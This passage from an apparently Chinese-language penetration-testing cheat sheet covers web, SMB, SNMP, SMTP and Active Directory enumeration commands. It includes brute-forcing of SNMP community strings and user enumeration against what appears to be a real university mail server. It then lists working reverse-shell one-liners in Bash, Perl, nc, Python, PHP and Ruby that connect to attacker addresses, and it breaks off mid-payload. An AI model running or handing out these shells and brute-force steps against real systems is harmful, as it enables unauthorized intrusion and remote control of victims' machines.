class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">u 枚举用户名，默认从1-10</span><br><span class="line"></span><br><span class="line">u[10-20] 枚举用户名，配置从10-20</span><br><span class="line"></span><br><span class="line">p 枚举插件</span><br><span class="line"></span><br><span class="line">vp 只枚举有漏洞的插件</span><br><span class="line"></span><br><span class="line">ap 枚举所有插件，时间较长</span><br><span class="line"></span><br><span class="line">tt 列举缩略图相关的文件</span><br><span class="line"></span><br><span class="line">t 枚举主题信息</span><br><span class="line"></span><br><span class="line">vt 只枚举存在漏洞的主题</span><br><span class="line"></span><br><span class="line">at 枚举所有主题，时间较长</span><br><span class="line"></span><br><span class="line">可以指定多个扫描选项，例：&quot;-e tt,p&quot;</span><br><span class="line"></span><br><span class="line">如果没有指定选项，默认选项为：&quot;vt,tt,u,vp&quot;</span><br><span class="line"></span><br><span class="line">--exclude-content-based &quot;&lt;regexp or string&gt;&quot;</span><br><span class="line"></span><br><span class="line">当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹</span><br><span class="line"></span><br><span class="line">--config-file | -c &lt;config file使用指定的配置文件</span><br><span class="line"></span><br><span class="line">--user-agent | -a &lt;User-Agent指定User-Agent</span><br><span class="line"></span><br><span class="line">--cookie &lt;String指定cookie</span><br><span class="line"></span><br><span class="line">--random-agent | -r 使用随机User-Agent</span><br><span class="line"></span><br><span class="line">--follow-redirection 如果目标包含一个重定向，则直接跟随跳转</span><br><span class="line"></span><br><span class="line">--batch 无需用户交互，都使用默认行为</span><br><span class="line"></span><br><span class="line">--no-color 不要采用彩色输出</span><br><span class="line"></span><br><span class="line">--wp-content-dir &lt;wp content dirWPScan会去发现wp-content目录，用户可手动指定</span><br><span class="line"></span><br><span class="line">--wp-plugins-dir &lt;wp plugins dir指定wp插件目录，默认是wp-content/plugins</span><br><span class="line"></span><br><span class="line">--proxy &lt;[protocol://]host:port设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议</span><br><span class="line"></span><br><span class="line">--proxy-auth &lt;username:password设置代理登陆信息</span><br><span class="line"></span><br><span class="line">--basic-auth &lt;username:password设置基础认证信息</span><br><span class="line"></span><br><span class="line">--wordlist | -w &lt;wordlist指定密码字典</span><br><span class="line"></span><br><span class="line">--username | -U &lt;username指定爆破的用户名</span><br><span class="line"></span><br><span class="line">--usernames &lt;path-to-file指定爆破用户名字典</span><br><span class="line"></span><br><span class="line">--threads | -t &lt;number of threads指定多线程</span><br><span class="line"></span><br><span class="line">--cache-ttl &lt;cache-ttl设置 cache TTL</span><br><span class="line"></span><br><span class="line">--request-timeout &lt;request-timeout请求超时时间</span><br><span class="line"></span><br><span class="line">--connect-timeout &lt;connect-timeout连接超时时间</span><br><span class="line"></span><br><span class="line">--max-threads &lt;max-threads最大线程数</span><br><span class="line"></span><br><span class="line">--throttle &lt;milliseconds当线程数设置为1时，设置两个请求之间的间隔</span><br><span class="line"></span><br><span class="line">--help | -h 输出帮助信息</span><br><span class="line"></span><br><span class="line">--verbose | -v 输出Verbose</span><br><span class="line"></span><br><span class="line">--version 输出当前版本</span><br></pre></td></tr></table></figure><p>使用用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url [wordpress url]   //扫描WordPress漏洞</span><br><span class="line">wpscan --url https://www.xxxxxxx.wiki/ --enumerate u   //枚举用户</span><br><span class="line">wpscan --url www.xxx.com --enumerate ap //扫描所有插件</span><br><span class="line">wpscan --url www.xxx.com --enumerate vp //扫描容易受攻击的插件</span><br></pre></td></tr></table></figure><h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><p>Whatweb是一个基于Ruby语言的开源网站指纹识别软件，正如它的名字一样，whatweb能够识别各种关于网站的详细信息包括：CMS类型、博客平台、中间件、web框架模块、网站服务器、脚本类型、JavaScript库、IP、cookie等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://baidu.com or 192.168.1.1/24    //扫描网站或者网段</span><br><span class="line">whatweb –input-file=/root/桌面/123.txt        //导入txt进行扫描</span><br><span class="line">whatweb -i ‘/root/桌面/123.txt’               //同上</span><br><span class="line">whatweb 192.168.159.1 –log-xml=result.xml    //将扫描结果导入文件（result.xml）</span><br><span class="line">whatweb -v 192.168.1.1                      //详细列出ip的扫描内容</span><br><span class="line">whatweb 112.125.93.227/24 –url-suffix=”:8080″   //添加端口</span><br><span class="line">whatweb -a 3 http://ndsec.doone.com.cn/forum.php   //探测强度等级为3</span><br><span class="line">whatweb -v –proxy-user admin:passwoed www.dvwa.com/login.php //–proxy-user admin:password  //通过–proxy-user的方式可以指定用户名和密码进行探测</span><br><span class="line">whatweb -v -c=’PHPSESSID=031a6d42fac3bdce24bf4dc02accd080; security=low’ http://www.dvwa.com/login.php  //通过-c参数指定cookie的值</span><br><span class="line">whatweb -l //使用-l参数可以列出插件的列表，包括插件的名称以及插件的描述</span><br><span class="line">whatweb –info-plugins=”YouTube”   //通过如上参数可以查看具体插件的内容</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.freebuf.com/column/152611.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152611.html</a></p><h2 id="RPC-NetBios-SMB"><a href="#RPC-NetBios-SMB" class="headerlink" title="RPC/NetBios/SMB"></a>RPC/NetBios/SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rpcinfo -p $TARGET</span><br><span class="line">nbtscan $TARGET</span><br><span class="line"></span><br><span class="line">#list shares</span><br><span class="line">smbclient -L //$TARGET -U &quot;&quot;</span><br><span class="line"></span><br><span class="line"># null session</span><br><span class="line">rpcclient -U &quot;&quot; $TARGET   </span><br><span class="line">smbclient -L //$TARGET</span><br><span class="line">enum4linux $TARGET</span><br></pre></td></tr></table></figure><h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>Sun RPC（远程过程调用）是一种Unix协议，用来实现多种服务比如NFS。最初由Sun开发，但现在广泛使用在其他平台上（包括Digital Unix的）。也被称为开放式网络计算（ONC）。</p><p>Sun RPC包带有一个RPC编译器，自动生成服务端和客户端的存根。</p><p>nmap带有将近600个RPC程序的数据库。许多RPC服务使用高端口编号或者使用UDP协议，RPC程序还有严重的远程利用漏洞。所以网络管理员和安全审计人员往往希望了解更多在他们的网络内有关任何RPC程序。</p><p>rpc简介<a href="https://www.jianshu.com/p/2accc2840a1b" target="_blank" rel="noopener">https://www.jianshu.com/p/2accc2840a1b</a></p><h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><p>之前我有写过关于smbclient</p><p>相关链接<a href="https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/">https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/</a></p><h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>num4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000/XP/2003，在Windows 7/10系统，部分功能受限。总的来说，一个工具可以获取这么多的信息，也算非常强大了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# enum4linux 192.168.199.114</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 20 10:04:53 2019</span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.199.114</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &apos;&apos;</span><br><span class="line">Password ......... &apos;&apos;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"> ======================================================= </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.199.114    |</span><br><span class="line"> ======================================================= </span><br><span class="line">[E] Can&apos;t find workgroup/domain</span><br><span class="line"> =============================================== </span><br><span class="line">|    Nbtstat Information for 192.168.199.114    |</span><br><span class="line"> =============================================== </span><br><span class="line">Looking up status of 192.168.199.114</span><br><span class="line">No reply from 192.168.199.114</span><br><span class="line"> ======================================== </span><br><span class="line">|    Session Check on 192.168.199.114    |</span><br><span class="line"> ======================================== </span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</span><br><span class="line">[E] Server doesn&apos;t allow session using username &apos;&apos;, password &apos;&apos;.  Aborting remainder of tests.</span><br></pre></td></tr></table></figure><p>之后如果发现可以与smbclient配合食用，具体链接：<a href="https://www.cnblogs.com/bmjoker/p/9174804.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9174804.html</a></p><h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p>用于SNMP <code>auxiliary/scanner/snmp/snmp_login</code></p><p><img src="\images\Pentesting\snmpmetasploit.png" alt></p><p>设置一下参数并运行，可以看到Metasploit成功运行，在Community String中显示”mike”</p><h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.131.135 -u admin -P Desktop/demo/wordlist -M snmp</span><br><span class="line">没有-u admin  但medusa需要,我们给赋个值</span><br></pre></td></tr></table></figure><p><img src="\images\Pentesting\snmpmedusa.png" alt></p><p>同样的，Medusa发现了值wei”mike”的字符串</p><h3 id="onesixtyone"><a href="#onesixtyone" class="headerlink" title="onesixtyone"></a>onesixtyone</h3><p>Onesoxtyone工具，它还试图使用基于字典的尝试猜测/破解SNMP社区字符串，正如我们在下面看到的，它已经确定了“mike”是有效的字符串</p><p><img src="\images\Pentesting\snmponesixtyone.png" alt></p><h3 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h3><p>snmpwalk用来查看支持SNMP协议的设备的一些信息，如cisco交换机或路由器IP地址等，也可用来协助开发SNMP功能。我们已经将”mike”作为Community字符串了，现在我们将其传递给SNMPWALK工具，然后将目标IP作为目标。这将从SNMP服务中提取所有可能的信息。</p><p>下面的MIB值对应于特定的MicrosoftWindows SNMP参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.3.6.1.2.1.25.1.6.0系统进程</span><br><span class="line">1.3.6.1.2.1.25.4.2.1.2运行程序</span><br><span class="line">1.3.6.1.2.1.25.4.2.1.4流程路径</span><br><span class="line">1.3.6.1.2.1.25.2.3.1.4存储单元</span><br><span class="line">1.3.6.1.2.1.25.6.3.1.2软件名称</span><br><span class="line">1.3.6.1.4.1.77.1.2.25用户帐户</span><br><span class="line">1.3.6.1.2.1.6.13.1.3 TCP 本地端口</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">利用snmpwalk查看公共的信息</span><br><span class="line"># Windows User Accounts</span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25 // 得到取得windows端的系统进程用户数等</span><br><span class="line"></span><br><span class="line"># Windows Running Programs</span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2</span><br><span class="line"></span><br><span class="line"># Windows Hostname</span><br><span class="line">snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5</span><br><span class="line"></span><br><span class="line"># Windows Share Information</span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1</span><br><span class="line"></span><br><span class="line"># Windows Share Information</span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27</span><br><span class="line"></span><br><span class="line"># Windows TCP Ports</span><br><span class="line">snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3</span><br><span class="line"></span><br><span class="line"># Software Name</span><br><span class="line">snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2</span><br><span class="line"></span><br><span class="line"># brute-force community strings</span><br><span class="line">onesixtyone -i snmp-ips.txt -c community.txt</span><br><span class="line"></span><br><span class="line">snmp-check $TARGET</span><br></pre></td></tr></table></figure><p>更多参考链接：<a href="https://www.freebuf.com/column/144144.html" target="_blank" rel="noopener">https://www.freebuf.com/column/144144.html</a></p><h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SMTP命令    命令功能</span><br><span class="line">MAIL FROM 命令中指定的地址是发件人地址</span><br><span class="line">RCPT TO     标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL FROM命令后面</span><br><span class="line">VRFY     用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令</span><br><span class="line">EXPN     验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用</span><br></pre></td></tr></table></figure><h3 id="smtp-user-enum"><a href="#smtp-user-enum" class="headerlink" title="smtp-user-enum"></a>smtp-user-enum</h3><p> smtp-user-enum是kali自带的枚举工具，通过上述三个命令来枚举SMTP服务的用户帐户(sendmail)。</p><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Usage: smtp-user-enum [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets ) </span><br><span class="line">options:</span><br><span class="line">-m &lt;number&gt;   最大线程数(默认: 5)</span><br><span class="line">-M &lt;mode&gt;  使用方法方式 EXPN, VRFY or RCPT (默认: VRFY)</span><br><span class="line">-u &lt;user&gt;   指定用户</span><br><span class="line">-f &lt;addr&gt;   邮箱地址，只能用在 &quot;RCPT TO&quot; mode (默认: user@example.com)</span><br><span class="line">-D &lt;domaim&gt;   使用电子邮件地址添加到用户列表在域 (默认: none)使用邮箱代替用户名，比如:&quot;-D example.com&quot;域来使用代替testA@example.com, testB@example.com</span><br><span class="line">-U &lt;file&gt;   通过smtp服务指定文件里的用户名检查</span><br><span class="line">-t &lt;host&gt;   指定主机来运行smtp服务器主机服务</span><br><span class="line">-T &lt;file&gt;   指定文件来运行smtp服务器主机服务</span><br><span class="line">-p &lt;port&gt;   设置TCP端口号 (默认: 25)</span><br><span class="line">-d   调试</span><br><span class="line">-t &lt;time&gt;   最大返回时间 (default: 5)</span><br><span class="line">-v   版本 </span><br><span class="line">-h   帮助</span><br><span class="line"></span><br><span class="line">可以参考 smtp-user-enum-user-docs.pdf 文档， </span><br><span class="line">Examples:</span><br><span class="line">root@kali:~$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</span><br><span class="line">root@kali:~$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1</span><br><span class="line">root@kali:~$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt</span><br><span class="line">root@kali:~$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1</span><br><span class="line">root@kali:~$ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</span><br></pre></td></tr></table></figure><h3 id="metasploit-1"><a href="#metasploit-1" class="headerlink" title="metasploit"></a>metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smtp/smtp_enum </span><br><span class="line">msf auxiliary(scanner/smtp/smtp_enum) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smtp/smtp_enum):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                                                Required  Description</span><br><span class="line">   ----       ---------------                                                --------  -----------</span><br><span class="line">   RHOSTS                                                                    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT      25                                                             yes       The target port (TCP)</span><br><span class="line">   THREADS    1                                                              yes       The number of concurrent threads</span><br><span class="line">   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users</span><br><span class="line">   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/smtp/smtp_enum) &gt; set rhosts 202.38.193.203</span><br><span class="line">rhosts =&gt; 202.38.193.203</span><br><span class="line">msf auxiliary(scanner/smtp/smtp_enum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 202.38.193.203:25     - 202.38.193.203:25 Banner: 220 mxt.scut.edu.cn ESMTP Postfix</span><br><span class="line">[+] 202.38.193.203:25     - 202.38.193.203:25 Users found: adm, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, root, sshd, sync, uucp, webmaster, www</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h3 id="nmap脚本"><a href="#nmap脚本" class="headerlink" title="nmap脚本"></a>nmap脚本</h3><p>nmap有扫描脚本smtp-enum-users.nse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 25 --script smtp-enum-users.nse 202.38.193.203</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-24 10:23 CST</span><br><span class="line">Nmap scan report for news.scut.edu.cn (202.38.193.203)</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">| smtp-enum-users: </span><br><span class="line">|   root</span><br><span class="line">|   admin</span><br><span class="line">|   administrator</span><br><span class="line">|   webadmin</span><br><span class="line">|   sysadmin</span><br><span class="line">|   netadmin</span><br><span class="line">|   guest</span><br><span class="line">|   user</span><br><span class="line">|   web</span><br><span class="line">|_  test</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds</span><br></pre></td></tr></table></figure><p>参考链接：<a href="http://www.lemurs.me/2018/08/23/smtp-user-enum/" target="_blank" rel="noopener">http://www.lemurs.me/2018/08/23/smtp-user-enum/</a></p><h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># current domain info //当前域信息</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># domain trusts //域信任</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># current forest info //当前林信息</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line"># get forest trust relationships //林信任信息</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># get DCs of a domain   //列出域所有DC</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># get DC for currently authenticated session //拿到DC当前的认证信息</span><br><span class="line">nltest /dsgetdc:offense.local</span><br><span class="line"></span><br><span class="line"># get domain trusts from cmd shell  //cmd里得到信任域信息</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># get user info    //得到用户信息</span><br><span class="line">nltest /user:&quot;spotless&quot;</span><br><span class="line"></span><br><span class="line"># get DC for currently authenticated session  //得到当前经过身份认证的DC</span><br><span class="line">set l</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems   //获得用户信息</span><br><span class="line">set u</span><br></pre></td></tr></table></figure><h1 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h1><h2 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h2><p>shell反弹原理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2548</span><br><span class="line">https://xz.aliyun.com/t/2549</span><br></pre></td></tr></table></figure><p>在本机执行<code>nc -lvp 1234</code></p><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure><h3 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h3 id="URL-Encoded-Perl-Linux"><a href="#URL-Encoded-Perl-Linux" class="headerlink" title="URL-Encoded Perl: Linux"></a>URL-Encoded Perl: Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 